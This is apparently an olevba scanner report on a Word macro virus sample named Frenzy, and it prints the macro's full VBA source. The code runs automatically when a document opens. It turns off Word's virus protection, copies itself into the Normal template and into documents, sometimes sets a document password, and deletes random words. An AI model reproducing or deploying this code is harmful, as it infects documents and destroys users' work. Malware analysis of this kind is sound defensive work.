olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Frenzy
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Frenzy - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Frenzy.bas 
in file: ./Virus.MSWord.Frenzy - OLE stream: 'Macros/VBA/Frenzy'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Frenzy!"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.Frenzy.AutoOpen"
On Error Resume Next

    Options.VirusProtection = False

    If MacroContainer = NormalTemplate.Name Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Frenzy", Object:=wdOrganizerObjectProjectItems
        If ActiveDocument.SaveFormat = wdFormatDocument Then
            ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
        End If
    Else
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Frenzy", Object:=wdOrganizerObjectProjectItems
        If NormalTemplate.Saved = False Then
            NormalTemplate.Save
        End If
    End If

    If Day(Now()) = Int(Rnd() * 31 + 1) Then

        Assistant.Visible = True

        With Assistant.NewBalloon
            .Animation = msoAnimationGetAttentionMajor
            .Heading = "Attention:"
            .Text = "Word97.Frenzy by Pyro [VBB]"
            .Icon = msoIconAlert
            .Show
        End With

    End If


    If Minute(Now()) = Int(Rnd() * 60) Then

        If ActiveDocument.HasPassword = False Then
            ActiveDocument.Password = "Frenzy"
        End If

    End If


    If ActiveDocument.Words.Count > 25 Then

        Char = Int(Rnd() * ActiveDocument.Words.Count)
        ActiveDocument.Words(Char).Delete

    End If

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

